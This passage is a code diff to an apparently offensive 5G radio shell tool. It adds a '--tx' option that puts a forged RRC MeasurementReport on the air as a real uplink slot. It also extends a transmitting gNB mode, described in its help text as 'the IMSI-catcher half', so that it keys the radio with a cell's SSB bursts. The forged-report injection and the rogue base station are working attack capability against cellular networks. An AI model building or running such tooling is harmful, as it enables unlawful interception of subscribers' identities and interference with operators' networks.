+                                "${args[2]:-640000}" "${args[3]:-1}"
             else
                 nair_cmd_gen_conf "${args[0]:-00101}" "${args[1]:-n78}" \
                                   "${args[2]:-640000}" "${args[3]:-1}"
             fi ;;
         --gen-core-conf) nair_gen_open5gs_conf "${1:-00101}" "${2:-7}" ;;
         --build-rrc-reconfig) nair_cmd_build_rrc_reconfig "${1:-}" ;;
-        --build-meas-report)  nair_cmd_build_meas_report "${1:-}" ;;
+        --build-meas-report)
+            # --tx is a modifier: it puts the forged report on the air as a
+            # real PUSCH slot instead of only printing the PDU.
+            local mtflag=0 mspec=""
+            while (($#)); do
+                case "$1" in
+                    --tx) mtflag=1 ;;
+                    *)    mspec="$1" ;;
+                esac
+                shift
+            done
+            if (( mtflag )); then
+                nair_cmd_meas_report_tx "$mspec"
+            else
+                nair_cmd_build_meas_report "$mspec"
+            fi ;;
         --decode-rrc)         nair_cmd_decode_rrc "${1:-}" ;;
         --beam-sweep)         nair_cmd_beam_sweep "${1:-}" ;;
         --start)        nair_start "${1:-$NAIR_CONF}" ;;
@@ -3652,11 +5514,20 @@ Usage: $0 COMMAND
                                 indices and steer a forged report at one
   --build-rrc-reconfig <tx=N[,meas=i/o/c,...]>
                                 build an RRCReconfiguration (TS 38.331 6.2.2)
-  --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]>
-                                build a MeasurementReport (TS 38.331 6.2.2)
+  --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]> [--tx]
+                                build a MeasurementReport (TS 38.331 6.2.2);
+                                --tx carries that PDU on a real CP-OFDM PUSCH
+                                slot and keys the radio (arfcn=, band= and
+                                scid= steer the uplink waveform and are not
+                                encoded into the report). Without a radio --tx
+                                fails and prints no success line.
   --gen-gnb-conf [plmn] [band] [arfcn] [pci] [--tx]
                                 write an srsRAN gNB config; --tx writes the
-                                TRANSMITTING gNB (the IMSI-catcher half)
+                                TRANSMITTING gNB (the IMSI-catcher half) and
+                                then keys the radio with that cell's SSB burst
+                                set. NAIR_TX_DRYRUN=1 builds and decodes the
+                                waveform but transmits nothing. Without a radio
+                                --tx fails and prints no success line.
   --gen-core-conf [plmn] [tac]  write a minimal Open5GS AMF slice
   --start [conf]                start the gNB (needs srsRAN)
   --stop                        stop the gNB (idempotent)
